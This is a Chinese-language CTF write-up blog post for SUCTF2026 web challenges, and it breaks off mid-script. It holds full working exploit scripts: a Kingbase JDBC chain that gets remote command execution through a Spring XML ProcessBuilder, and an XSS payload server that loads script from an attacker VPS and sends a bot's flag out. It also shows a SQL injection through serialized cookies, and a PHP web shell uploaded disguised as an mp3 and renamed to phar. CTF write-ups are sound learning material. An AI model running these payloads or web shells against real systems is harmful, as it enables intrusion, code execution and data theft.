---
title: SUCTF2026-WriteUp
layout: post
categories: CTF-Writeup
date: 2026-3-17 9:0:09
tags: CTF
description: SUCTF2026-WriteUp
index_img: https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202603170907662.png
banner_img: https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202603170907662.png

---

# SUCTF2026-Writeup

- 本次lz雷泽战队排名第9，感谢师傅们辛苦付出！

![img](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202603170907662.png)

![img](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202603170801748.png)

# Web

## SU_Thief

懒惰的管理员忽略了最近的thief可以帮助他偷取/root/flag"。这很可能是指 Grafana 的文件读取漏洞 CVE-2021-43798

题面里最关键的信息有两点：

- 最终目标文件是 `/root/flag`
- “closest thief” 很像是在暗示某个本机附近、和业务进程靠得很近的组件被滥用

最初访问目标时，首页表现为一个 `Grafana v11.0.0` 实例，响应头还能看到 `Caddy`，说明整体结构大致是：

前端反代：`Caddy`

后端服务：`Grafana`

探测时能发现一些公开接口，例如：

```
/api/health
/metrics
/swagger
/public/openapi3.json
```

另外，密码找回接口存在用户名枚举现象。对 `/api/user/password/send-reset-email` 进行测试时：

用户名填 `admin`，返回 `500 Failed to send email`

用户名填不存在的账号，返回 `200 Email sent`

这说明可以枚举用户名，但单靠这一点还不足以直接拿下管理员。

后续再次检查目标时，服务状态已经改变。首页不再是 Grafana，而是 `Caddy` 直接提供文件服务。

访问下面这个路径：

- `http://156.239.26.40:13333/.config/caddy/autosave.json`

可以得到配置：

```JSON
{"apps":{"http":{"servers":{"srv0":{"listen":[":80"],"routes":[{"handle":[{"browse":{},"handler":"file_server","root":"/root"}]}]}}}}}
```

这个配置很关键，说明当前 Caddy 已经被改成：

- 使用 `file_server`
- 网站根目录为 `/root`
- 开启了目录浏览 `browse`

也就是说，`/root` 已经直接暴露到 Web 根目录上。

既然 `/root` 被映射成了站点根目录，那么目标文件：

- `/root/flag`

就会直接对应成：

- `http://156.239.26.40:13333/flag`

访问后可以直接得到：

```Plain
SUCTF{c4ddy_4dm1n_4p1_2019_pr1v35c}
```

exp：

```Python
#!/usr/bin/env python3
import argparse
import json
import sys
from urllib.error import HTTPError, URLError
from urllib.request import urlopen


def fetch(url: str, timeout: int = 10) -> str:
     with urlopen(url, timeout=timeout) as resp:
         return resp.read().decode("utf-8", errors="replace")


def main() -> int:
     parser = argparse.ArgumentParser(
         description="Fetch the exposed Caddy config and flag for the SU_Thief challenge."
     )
     parser.add_argument(
         "base",
         nargs="?",
         default="http://156.239.26.40:13334",
         help="Base URL of the target, default: %(default)s",
     )
     args = parser.parse_args()

     base = args.base.rstrip("/")
     config_url = f"{base}/.config/caddy/autosave.json"
     flag_url = f"{base}/flag"

     try:
         config_text = fetch(config_url)
         flag_text = fetch(flag_url).strip()
     except HTTPError as exc:
         print(f"[!] HTTP error: {exc.code} {exc.reason}", file=sys.stderr)
         return 1
     except URLError as exc:
         print(f"[!] Network error: {exc.reason}", file=sys.stderr)
         return 1
     except Exception as exc:
         print(f"[!] Unexpected error: {exc}", file=sys.stderr)
         return 1

     print(f"[+] Config URL: {config_url}")
     try:
         parsed = json.loads(config_text)
         print(json.dumps(parsed, indent=2, ensure_ascii=False))
     except json.JSONDecodeError:
         print(config_text)

     print()
     print(f"[+] Flag URL: {flag_url}")
     print(flag_text)
     return 0


if __name__ == "__main__":
     raise SystemExit(main())
```

得到：`SUCTF{c4ddy_4dm1n_4p1_2019_pr1v35c}`

## SU_jdbc-master

![img](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202603170802565.png)

这道题的利用链可以拆成四步：

1. 利用路径匹配语义不一致，绕过拦截器进入真实测试接口。
2. 利用 `multipart` 上传时的临时文件，制造一个可控的本地文件描述符。
3. 利用 Kingbase JDBC 的 `ConfigurePath` 从 `/proc/self/fd/<n>` 读取我们伪造的配置文件。
4. 在配置中恢复被应用层拦掉的 `socketFactory`，再借 Spring XML 加载触发命令执行，最后把 `/flag` 写到静态目录中回显。

本个题目的核心接口是：

```
POST /api/connection/suctf
```

但是应用加了一个 `PathInterceptor`，会拦截包含 `suctf` 的路径。这里的关键点不是“有没有拦截器”，而是：

- Spring Boot 路由匹配和拦截器内部取路径的语义不一致。
- 因此存在一个能被路由到 `/suctf`，但又不会被拦截器正确识别的路径。

可用绕过路径是：

```
/api/connection/%C5%BFuctf
```

这个路径可以正常命中控制器，所以后续所有请求都走这条路径。

应用会过滤一批危险 JDBC 参数，例如：

- `socketFactory`
- `socketFactoryArg`
- `sslfactory`
- `sslhostnameverifier`
- `sslpasswordcallback`
- `authenticationPluginClassName`
- `loggerFile`
- `loggerLevel`

如果只是普通传参，这条路是走不通的。

但是 Kingbase JDBC 还支持一个额外参数：

```Plain
ConfigurePath
```

它会在真正建立连接前，从本地加载一个 `properties` 文件。也就是说，我们只要能让：

```Plain
ConfigurePath=/proc/self/fd/<某个打开的文件描述符>
```

成立，驱动就会把这个 fd 对应的内容当成配置文件读取。这样一来，被应用过滤掉的 `socketFactory` 等参数就能从本地配置文件里“复活”。

题目使用的是 Spring Boot + Tomcat。处理 `multipart/form-data` 上传时，Tomcat 会先把上传内容落到临时文件，再交给业务逻辑。

因此只要我们：

1. 发一个文件上传请求；
2. 故意只发前半段数据，不让请求立刻结束；
3. 让服务端线程卡在 `multipart` 处理阶段；

那么这个临时文件就会一直处于“已打开但请求未完成”的状态。

在 Linux 下，这个打开的文件可以通过：

```Plain
/proc/self/fd/<fd>
```

访问。于是我们就把“远程上传的临时文件”变成了“本地可读配置文件”。

利用时一共需要三个请求，且它们运行在同一个 Java 进程里：

第一步：上传恶意 Spring XML

先发一个 `multipart` 请求，把内容做成 Spring XML，作用是执行命令：

```XML
<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
  <constructor-arg>
    <list>
      <value>/bin/sh</value>
      <value>-c</value>
      <value>cat /flag > /tmp/tomcat-docbase.xxx/marker.txt</value>
    </list>
  </constructor-arg>
</bean>
```

这个上传请求不要一次发完，要“挂住”，这样 XML 临时文件对应的 fd 会一直开着。

再发第二个 `multipart` 请求，内容是一个 `properties` 文件：

```Properties
socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext
socketFactoryArg=file:/proc/self/fd/<xml_fd>
```

同样，这个请求也只发一半并挂住。这样第二个临时文件也会对应一个打开的 fd。

最后发正常的 JSON 请求到绕过后的接口：

```JSON
{
  "urlType": "jdbcUrl",
  "jdbcUrl": "jdbc:kingbase8:test?ConfigurePath=/proc/self/fd/<cfg_fd>",
  "driver": "com.kingbase8.Driver",
  "username": "x",
  "password": "y"
}
```

此时驱动读取 `cfg_fd` 对应的 `properties`，从里面取出 `socketFactory` 和 `socketFactoryArg`，再去加载 `xml_fd` 对应的 XML，最终通过 `ProcessBuilder` 执行命令。

题目有安全管理器和出网限制，最稳妥的方式不是反弹 shell，而是本地写文件回显。

Tomcat 运行时会创建一个临时 docbase 目录，通常形如：

```Bash
/tmp/tomcat-docbase*
```

而 Spring Boot 的静态资源链会把这个目录作为可访问资源的一部分。因此可以直接把 `/flag` 写进去：

```Bash
DOC=$(find /tmp -maxdepth 1 -type d -name 'tomcat-docbase*' | head -n1)
cat /flag > "$DOC/xxx.txt"
```

然后访问：

即可拿到 flag。

解题脚本如下：

```Python
#!/usr/bin/env python3
import argparse
import json
import random
import socket
import string
import threading
import time
import urllib.error
import urllib.request


BYPASS_PATH = "/api/connection/%C5%BFuctf"


def rand_id(n: int = 6) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(n))


class HoldUpload:
    def __init__(
        self,
        host: str,
        port: int,
        path: str,
        boundary: str,
        content: bytes,
        filler: bytes,
        name: str,
    ) -> None:
        self.host = host
        self.port = port
        self.path = path
        self.boundary = boundary
        self.content = content
        self.filler = filler
        self.name = name
        self.started = threading.Event()
        self.release = threading.Event()
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.error: Exception | None = None

    def start(self) -> None:
        self.thread.start()
        if not self.started.wait(12):
            raise RuntimeError(f"{self.name} upload did not start in time")
        if self.error is not None:
            raise self.error

    def finish(self) -> None:
        self.release.set()
        self.thread.join(10)
        if self.error is not None:
            raise self.error

    def _run(self) -> None:
        try:
            trailer = f"\r\n--{self.boundary}--\r\n".encode()
            prefix = (
                f"--{self.boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="{self.name}"\r\n'
                "Content-Type: text/plain\r\n\r\n"
            ).encode() + self.content
            total_len = len(prefix) + len(self.filler) + len(trailer)
            headers = (
                f"POST {self.path} HTTP/1.1\r\n"
                f"Host: {self.host}:{self.port}\r\n"
                f"Content-Type: multipart/form-data; boundary={self.boundary}\r\n"
                f"Content-Length: {total_len}\r\n"
                "Connection: close\r\n\r\n"
            ).encode()
            half = len(self.filler) // 2

            sock = socket.create_connection((self.host, self.port), timeout=8)
            sock.sendall(headers + prefix + self.filler[:half])
            self.started.set()
            if not self.release.wait(20):
                raise RuntimeError(f"{self.name} upload was not released in time")
            sock.sendall(self.filler[half:] + trailer)
            while sock.recv(4096):
                pass
            sock.close()
        except Exception as exc:
            self.error = exc
            self.started.set()


class ExploitClient:
    def __init__(self, host: str, port: int, timeout: float) -> None:
        self.host = host
        self.port = port
        self.timeout = timeout
        self.base = f"http://{host}:{port}"

    def post_json(self, cfg_fd: int) -> str:
        body = json.dumps(
            {
                "urlType": "jdbcUrl",
                "jdbcUrl": f"jdbc:kingbase8:test?ConfigurePath=/proc/self/fd/{cfg_fd}",
                "driver": "com.kingbase8.Driver",
                "username": "x",
                "password": "y",
            }
        ).encode()
        req = urllib.request.Request(
            self.base + BYPASS_PATH,
            data=body,
            method="POST",
            headers={"Content-Type": "application/json"},
        )
        with urllib.request.urlopen(req, timeout=self.timeout) as resp:
            return resp.read().decode("utf-8", "replace")

    def fetch_marker(self, marker: str) -> str | None:
        try:
            with urllib.request.urlopen(
                self.base + f"/{marker}.txt", timeout=self.timeout
            ) as resp:
                data = resp.read().decode("utf-8", "replace")
                if "suctf{" in data:
                    return data.strip()
        except urllib.error.HTTPError:
            return None
        except Exception:
            return None
        return None


def build_xml(marker: str) -> bytes:
    cmd = (
        "DOC=$(find /tmp -maxdepth 1 -type d -name 'tomcat-docbase*' | head -n1); "
        f"cat /flag > \"$DOC/{marker}.txt\""
    )
    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>/bin/sh</value>
        <value>-c</value>
        <value>{cmd}</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
"""
    return xml.encode()


def try_attempt(client: ExploitClient, xml_fd: int, cfg_candidates: list[int], verbose: bool) -> str | None:
    marker = f"rflag_{client.port}_{rand_id()}"
    xml_up = HoldUpload(
        client.host,
        client.port,
        BYPASS_PATH,
        "----xml" + rand_id(),
        build_xml(marker),
        b" " * 200000,
        "exp.xml",
    )
    cfg = (
        "socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext\n"
        f"socketFactoryArg=file:/proc/self/fd/{xml_fd}\n"
    ).encode()
    cfg_up = HoldUpload(
        client.host,
        client.port,
        BYPASS_PATH,
        "----cfg" + rand_id(),
        cfg,
        b"#pad\n" * 40000,
        "cfg.properties",
    )

    try:
        xml_up.start()
        time.sleep(0.8)
        cfg_up.start()
        time.sleep(0.8)
    except Exception:
        for upload in (cfg_up, xml_up):
            try:
                upload.finish()
            except Exception:
                pass
        return None
    try:
        for cfg_fd in cfg_candidates:
            if verbose:
                print(f"[*] port={client.port} try xml_fd={xml_fd} cfg_fd={cfg_fd}", flush=True)
            try:
                client.post_json(cfg_fd)
            except Exception:
                pass
            time.sleep(1.0)
            flag = client.fetch_marker(marker)
            if flag:
                if verbose:
                    print(f"[+] port={client.port} hit xml_fd={xml_fd} cfg_fd={cfg_fd}", flush=True)
                return flag
    finally:
        for upload in (cfg_up, xml_up):
            try:
                upload.finish()
            except Exception:
                pass
    return None


def fd_search_order(include_full: bool) -> list[tuple[int, list[int]]]:
    preferred = [29, 27, 28, 30, 31]
    order: list[tuple[int, list[int]]] = []
    for xml_fd in preferred:
        order.append((xml_fd, [xml_fd + 2, xml_fd + 3, xml_fd + 1, xml_fd + 4]))
    if not include_full:
        return order
    full = list(range(24, 40))
    for xml_fd in range(24, 36):
        candidates = [fd for fd in full if fd != xml_fd]
        order.append((xml_fd, candidates))
    return order


def exploit_port(
    host: str,
    port: int,
    timeout: float,
    rounds: int,
    verbose: bool,
    include_full: bool,
) -> str | None:
    client = ExploitClient(host, port, timeout)
    attempts = fd_search_order(include_full)
    for round_index in range(1, rounds + 1):
        if verbose:
            print(f"[*] port={port} round={round_index}/{rounds}", flush=True)
        for xml_fd, cfg_candidates in attempts:
            flag = try_attempt(client, xml_fd, cfg_candidates, verbose)
            if flag:
                return flag
    return None


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Exploit JDBC Master on multiple ports")
    parser.add_argument("--host", default="1.95.113.59")
    parser.add_argument(
        "--ports",
        nargs="+",
        type=int,
        default=[10018, 10019, 10020],
        help="Remote ports to attack",
    )
    parser.add_argument("--timeout", type=float, default=8.0)
    parser.add_argument("--rounds", type=int, default=2, help="Full fd-scan rounds per port")
    parser.add_argument("--quiet", action="store_true", help="Suppress per-attempt logs")
    parser.add_argument(
        "--full-scan",
        action="store_true",
        help="Try the slow exhaustive fd search after the preferred combinations",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    results: dict[int, str | None] = {}
    for port in args.ports:
        flag = exploit_port(
            args.host,
            port,
            args.timeout,
            args.rounds,
            not args.quiet,
            args.full_scan,
        )
        results[port] = flag
        if flag:
            print(f"[FLAG] {port} {flag}", flush=True)
        else:
            print(f"[MISS] {port}", flush=True)

    missing = [port for port, flag in results.items() if not flag]
    if missing:
        raise SystemExit(f"flag not found for ports: {', '.join(map(str, missing))}")


if __name__ == "__main__":
    main()
```

![img](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202603170801992.png)

## SU_Note

站点是一个笔记系统，普通用户登录后可以访问 `/bot/`，提交一个 URL 让 Bot 去访问。题目提示 flag 在 Bot 的 notes 里，同时明确说了不要爆破密码，所以思路应该放在“获取 Bot 身份”而不是猜管理员密码。

一开始容易往 XSS 或者外带方向想，但实际抓包之后会发现，`/bot/` 的响应本身就已经把敏感信息送出来了。

对 `/bot/` 发起一次正常请求后，查看 `POST /bot/` 的响应头，可以看到服务端返回了两条 `Set-Cookie`，而且两条都是 `PHPSESSID`。

关键点在于：

- 第一条是 Bot 的会话；
- 第二条是当前普通用户的会话；
- 浏览器最终一般会覆盖成后一条，所以前台看不出异常。

也就是说，这里存在一个很直接的 session 泄露问题。服务端在处理 Bot 访问流程时，把 Bot 的 session 一起发给了客户端。

利用链非常短：

1. 注册并登录一个普通账号。
2. 进入 `/bot/`，提交一个站内 URL，比如首页 `/`。
3. 从 `POST /bot/` 的响应头中取出第一条 `PHPSESSID`。
4. 带着这条 Cookie 访问首页。
5. 读取 Bot 的笔记内容并匹配 flag。

这里不需要爆破密码，也不需要构造复杂的恶意页面，本质就是直接接管 Bot 的登录态。

脚本如下：

```Python
#!/usr/bin/env python3
import re
import sys
import uuid
from typing import Iterable

import requests


CSRF_RE = re.compile(r'name="_csrf"\s+value="([0-9a-f]+)"')
FLAG_RE = re.compile(r"SUCTF\{[01]+\}")
SID_RE = re.compile(r"PHPSESSID=([A-Za-z0-9]+)")


def extract_csrf(html: str) -> str:
    match = CSRF_RE.search(html)
    if not match:
        raise RuntimeError("failed to extract csrf token")
    return match.group(1)


def iter_set_cookie_lines(response: requests.Response) -> Iterable[str]:
    raw_headers = getattr(response.raw, "headers", None)
    if raw_headers is not None and hasattr(raw_headers, "getlist"):
        for line in raw_headers.getlist("Set-Cookie"):
            if line:
                yield line
        return

    header = response.headers.get("Set-Cookie", "")
    if header:
        for line in header.split(","):
            line = line.strip()
            if line:
                yield line


def register_and_login(session: requests.Session, base: str, username: str, password: str, timeout: int) -> None:
    resp = session.get(f"{base}/register.php", timeout=timeout)
    resp.raise_for_status()
    csrf = extract_csrf(resp.text)

    resp = session.post(
        f"{base}/register.php",
        data={"_csrf": csrf, "username": username, "password": password},
        timeout=timeout,
        allow_redirects=False,
    )
    if resp.status_code not in (200, 302):
        raise RuntimeError(f"register failed: status={resp.status_code}")

    resp = session.get(f"{base}/login.php", timeout=timeout)
    resp.raise_for_status()
    csrf = extract_csrf(resp.text)

    resp = session.post(
        f"{base}/login.php",
        data={
            "_csrf": csrf,
            "action": "login",
            "username": username,
            "password": password,
        },
        timeout=timeout,
        allow_redirects=False,
    )
    if resp.status_code not in (200, 302):
        raise RuntimeError(f"login failed: status={resp.status_code}")


def leak_bot_session(session: requests.Session, base: str, timeout: int) -> str:
    resp = session.get(f"{base}/bot/", timeout=timeout)
    resp.raise_for_status()
    csrf = extract_csrf(resp.text)

    resp = session.post(
        f"{base}/bot/",
        data={"_csrf": csrf, "action": "visit", "url": f"{base}/"},
        timeout=timeout,
        allow_redirects=False,
    )
    if resp.status_code not in (200, 302):
        raise RuntimeError(f"bot visit failed: status={resp.status_code}")

    for line in iter_set_cookie_lines(resp):
        match = SID_RE.search(line)
        if match:
            return match.group(1)

    raise RuntimeError("failed to find leaked bot PHPSESSID in Set-Cookie headers")


def fetch_flag(base: str, bot_sid: str, timeout: int) -> str:
    resp = requests.get(f"{base}/", cookies={"PHPSESSID": bot_sid}, timeout=timeout)
    resp.raise_for_status()

    match = FLAG_RE.search(resp.text)
    if not match:
        raise RuntimeError("flag not found in bot notes")
    return match.group(0)


def main() -> int:
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:80"
    base = base.rstrip("/")
    timeout = 20

    session = requests.Session()
    session.trust_env = False

    username = f"u{uuid.uuid4().hex[:8]}"
    password = "Passw0rd123!"

    register_and_login(session, base, username, password, timeout)
    bot_sid = leak_bot_session(session, base, timeout)
    flag = fetch_flag(base, bot_sid, timeout)
    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

运行以后：

![img](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202603170801978.png)

得到flag：SUCTF{110110100}

## SU_Note_rev

**漏洞分析**

**1. 反射型 XSS（search.php）**

搜索页面 `/search.php` 的 JavaScript 中，搜索关键词被直接嵌入 `<script>` 块：

```JavaScript
const searchQuery = "用户输入";
```

服务端只转义了 `"` 和 `\`，但没有转义 `</script>`。因此可以通过注入 `</script><script>恶意代码</script>` 闭合原 script 标签并插入新的脚本块。

**关键限制：** Bot 只在访问内部 URL（`http://127.0.0.1/...`）时才会执行 XSS。

**2. Bot 的安全限制**

Bot 使用 Puppeteer，配置了严格的请求拦截：

- `fetch()`、`XMLHttpRequest`、`new Image()`、`<iframe>` 等 JavaScript 发起的网络请求均被拦截
- `location.href`、`window.open` 等导航操作被阻止
- `localStorage` 在不同访问之间不持久化
- `document.cookie` 设置了 HttpOnly

**3. document.write 绕过请求拦截**

**核心发现：** 通过 `document.write()` 插入的 **parser-inserted** 资源（如 `<script src=...>`、`<link rel=stylesheet>`）可以绕过 Puppeteer 的请求拦截。

这是因为 parser-inserted 资源的加载由 HTML 解析器发起，走的是与 JavaScript API（fetch/XHR）不同的请求路径，不受 Puppeteer `page.setRequestInterception()` 的影响。

**测试验证：**

- `document.write('<script src=...>')` → 请求成功
- `document.write('<link rel=stylesheet href=...>')` → 请求成功
- `document.write('<iframe src=...>')` → 被拦截

更关键的是：**外部域名的** **`<script src>`** **也能成功加载！** 这意味着可以从攻击者的 VPS 加载任意 JavaScript。

**4. 外部脚本内 XHR 可用**

从 VPS 加载的外部脚本在 Bot 页面上下文中执行时，其发起的 `XMLHttpRequest` **不受拦截限制**。这使得攻击者可以：

- 用同步 XHR 读取 Bot 的任意页面（首页、搜索页、笔记详情）
- 通过 `document.write('<img src=``http://VPS/data>')` 将数据外带到 VPS

**攻击链**

```Plain
Bot 访问 XSS URL
    ↓
http://127.0.0.1/search.php?q=</script><script>document.write('<script src=http://VPS:18888/payload.js></'+'/script>')</script>
    ↓
document.write 绕过请求拦截，加载外部 JS
    ↓
外部 JS 使用同步 XHR 请求 /search.php?q=SUCTF
    ↓
从响应 HTML 中正则匹配 SUCTF{...} 格式的 flag
    ↓
通过 document.write('<img src=http://VPS/flag?d=FLAG>') 外带数据
```

**Exploit**

**VPS 端（exploit_server.py）**

```Python
#!/usr/bin/env python3
import http.server, urllib.parse
from datetime import datetime

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        parsed = urllib.parse.urlparse(path)
        params = urllib.parse.parse_qs(parsed.query)
        ts = datetime.now().strftime('%H:%M:%S')
        print(f"[{ts}] {self.client_address[0]} -> GET {path}", flush=True)

        if parsed.path == '/payload.js':
            js = r"""
function xhr(url) {
    var x = new XMLHttpRequest();
    x.open('GET', url, false);
    x.send();
    return x.responseText;
}
function exfil(tag, data) {
    document.write('<img src=http://VPS_IP:18888/' + tag + '?d=' + encodeURIComponent(data) + '>');
}
var search = xhr('/search.php?q=SUCTF');
var m = search.match(/SUCTF\{[01]+\}/);
if (m) { exfil('flag', m[0]); }
"""
            self.send_response(200)
            self.send_header('Content-Type', 'application/javascript')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(js.encode())
        else:
            data = params.get('d', [''])[0]
            if data:
                print(f"  [DATA] {data}", flush=True)
            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self.end_headers()
            self.wfile.write(b'GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;')

    def log_message(self, format, *args): pass

http.server.HTTPServer(('0.0.0.0', 18888), Handler).serve_forever()
```

**本地端（exploit_client.py）**

```Python
#!/usr/bin/env python3
import requests, re, uuid, urllib.parse, time

TARGET = "http://101.245.81.83:10004"
VPS_IP = "VPS_IP"

s = requests.Session()
# 注册 + 登录
resp = s.get(f'{TARGET}/register.php')
csrf = re.search(r'name="_csrf"\s+value="([0-9a-f]+)"', resp.text).group(1)
username = f'u{uuid.uuid4().hex[:8]}'
s.post(f'{TARGET}/register.php', data={'_csrf': csrf, 'username': username, 'password': 'P@ss1234'})
resp = s.get(f'{TARGET}/login.php')
csrf = re.search(r'name="_csrf"\s+value="([0-9a-f]+)"', resp.text).group(1)
s.post(f'{TARGET}/login.php', data={'_csrf': csrf, 'action': 'login', 'username': username, 'password': 'P@ss1234'})

# 构造 XSS URL 并提交给 Bot
xss = f"document.write('<script src=http://{VPS_IP}:18888/payload.js></' + 'script>')"
url = 'http://127.0.0.1/search.php?q=' + urllib.parse.quote(f'</script><script>{xss}</script>')
resp = s.get(f'{TARGET}/bot/')
csrf = re.search(r'name="_csrf"\s+value="([0-9a-f]+)"', resp.text).group(1)
s.post(f'{TARGET}/bot/', data={'_csrf': csrf, 'action': 'visit', 'url': url})
print("Check VPS logs for flag!")
```

本地运行

![img](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202603170802733.png)

VPS接收

![img](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202603170801525.png)

```HTTP
SUCTF{1101101010}
```

## SU_cmsAgain

 **1. 利用 Cookie 反序列化 + SQL 注入读取管理员密码**

构造 Cookie：

```PHP
a:1:{
  i:0;
  a:4:{
    s:6:"CartID";i:0;
    s:9:"ProductID";s:N:"0 UNION SELECT (SELECT ORD(SUBSTRING((SELECT AdminPassword FROM youdian_admin LIMIT 1),i,1)))";
    s:15:"ProductQuantity";i:1;
    s:16:"AttributeValueID";s:0:"";
  }
}
```

然后请求：

```HTTP
GET /index.php/Home/Public/setQuantity?id=0&quantity=1 HTTP/1.1
Host: 101.245.108.250:10015
Cookie: youdiany_shopping_cart=<urlencode后的恶意序列化数据>
```

观察响应中的：

```JSON
data.TotalItemPrice
```

逐位还原出：

```Plain
SUCTF@123!@#20260813
```

**2. 按后台协议登录**

登录接口：

```Plain
POST /index.php/Admin/Public/checkLogin
```

参数：

```Plain
username=21232f297a57a5a743894a0e4a801fc3
password=6位随机串 + base64(urlencode(SUCTF@123!@#20260813)) + 6位随机串
verifycode=
```

如果当前需要验证码，则先请求：

```Plain
GET /index.php/Admin/Public/showCode?username=admin
```

**3. 修改上传白名单并清缓存**

提交：

```Plain
POST /index.php/Admin/Config/saveUpload
```

关键参数：

```Plain
UPLOAD_FILE_TYPE=rar|zip|doc|docx|ppt|pptx|pdf|jpg|xls|png|gif|mp3|jpeg|bmp|swf|flv|ico|mp4|phar
MAX_UPLOAD_SIZE=10
UPLOAD_DIR_TYPE=1
```

然后清缓存：

```Plain
POST /index.php/Admin/Public/clearCache
Action=systemcache
```

 **4. 上传伪装文件**

前台上传接口：

```Plain
POST /index.php/Home/Public/upload
```

上传文件名：

```Plain
shell.mp3
```

内容：

```PHP
<?php system($_GET["c"]); __HALT_COMPILER(); ?>
```

成功后通常返回：

```JSON
{"status":3,"info":"上传成功!","data":{"Path":"\/Upload\/shell.mp3","FileName":"shell.mp3"}}
```

**5. 后台改名为** **`.phar`**

请求：

```Plain
POST /index.php/Admin/Resource/changeFileName
```

参数：

```Plain
DataSource=1
CurrentDir=./Upload/
OldFileName=shell.mp3
NewFileName=shell.phar
```

成功返回：

```JSON
{"status":1,"info":"重命名文件成功！","data":null}
```

 **6. 访问 .phar 获得 RCE**

访问：

```Plain
GET /Upload/shell.phar?c=id
```

如果回显类似：

```Plain
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

则说明已经命令执行成功。

**读取 Flag**

题目环境中最终读取的文件路径为：

```Plain
/b2b27f1a12e1f4bcb3927024bdb92531.txt
```

直接请求：

```Plain
GET /Upload/shell.phar?c=cat+/b2b27f1a12e1f4bcb3927024bdb92531.txt
```

得到：

```Plain
SUCTF{y0ud1an_c00l_LiHua}
```

 **自动化脚本**

```Python
import argparse
import base64
import hashlib
import json
import random
import string
from urllib.parse import quote

import requests

TARGET = "http://101.245.108.250:10015"
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
)
FLAG_PATH = "/b2b27f1a12e1f4bcb3927024bdb92531.txt"

def rand6():
    chars = string.ascii_letters + string.digits
    return "".join(random.choice(chars) for _ in range(6))

def wrap_admin_password(password):
    middle = base64.b64encode(quote(password, safe="").encode()).decode()
    return rand6() + middle + rand6()

def make_cart_cookie(payload):
    n = len(payload)
    serialized = (
        'a:1:{i:0;a:4:{s:6:"CartID";i:0;'
        f's:9:"ProductID";s:{n}:"{payload}";'
        's:15:"ProductQuantity";i:1;'
        's:16:"AttributeValueID";s:0:"";}}'
    )
    return quote(serialized, safe="")

def trigger_sqli(session, payload):
    cookie = make_cart_cookie(payload)
    headers = {
        "User-Agent": USER_AGENT,
        "Cookie": f"youdiany_shopping_cart={cookie}",
    }
    url = f"{TARGET}/index.php/Home/Public/setQuantity?id=0&quantity=1"
    r = session.get(url, headers=headers, timeout=15)
    r.raise_for_status()
    data = r.json()
    return data.get("data", {}).get("TotalItemPrice", "0.00")

def sqli_extract_string(session, subquery, max_len=128):
    out = []
    for i in range(1, max_len + 1):
        inner = f"SELECT ORD(SUBSTRING(({subquery}),{i},1))"
        payload = f"0 UNION SELECT ({inner})"
        value = trigger_sqli(session, payload)
        if value in ("0", "0.00", "", None):
            break
        code = int(float(value))
        if code <= 0:
            break
        out.append(chr(code))
        print(f"[+] extracted[{i}] = {''.join(out)}", flush=True)
    return "".join(out)

def login_admin(session, password, captcha=""):
    md5_admin = hashlib.md5(b"admin").hexdigest()
    data = {
        "username": md5_admin,
        "password": wrap_admin_password(password),
        "verifycode": captcha,
    }
    url = f"{TARGET}/index.php/Admin/Public/checkLogin"
    r = session.post(
        url,
        data=data,
        headers={"User-Agent": USER_AGENT, "X-Requested-With": "XMLHttpRequest"},
        timeout=15,
    )
    r.raise_for_status()
    try:
        resp = r.json()
    except json.JSONDecodeError:
        raise RuntimeError(f"login response is not JSON: {r.text[:200]}")
    print(f"[+] admin login response: {resp}", flush=True)
    status = int(resp.get("status", -1))
    if status != 3:
        raise RuntimeError("admin login failed; captcha may be required")

def enable_phar_upload(session):
    url = f"{TARGET}/index.php/Admin/Config/saveUpload"
    data = {
        "UPLOAD_FILE_TYPE": (
            "rar|zip|doc|docx|ppt|pptx|pdf|jpg|xls|png|gif|mp3|jpeg|bmp|swf|flv|"
            "ico|mp4|phar"
        ),
        "MAX_UPLOAD_SIZE": "10",
        "UPLOAD_DIR_TYPE": "1",
    }
    r = session.post(url, data=data, headers={"User-Agent": USER_AGENT}, timeout=15)
    r.raise_for_status()
    print(f"[+] saveUpload: {r.text}", flush=True)

    clear_url = f"{TARGET}/index.php/Admin/Public/clearCache"
    r = session.post(
        clear_url,
        data={"Action": "systemcache"},
        headers={"User-Agent": USER_AGENT, "X-Requested-With": "XMLHttpRequest"},
        timeout=15,
    )
    r.raise_for_status()
    print(f"[+] clearCache: {r.text}", flush=True)

def upload_shell_as_mp3(session):
    url = f"{TARGET}/index.php/Home/Public/upload"
    shell = b'<?php system($_GET["c"]); __HALT_COMPILER(); ?>'
    data = {
        "savepath": "./Upload/",
        "addwater": "no",
        "isthumb": "0",
        "isrename": "1",
        "currentfile": "imgFile",
        "UploadSource": "0",
    }
    files = {
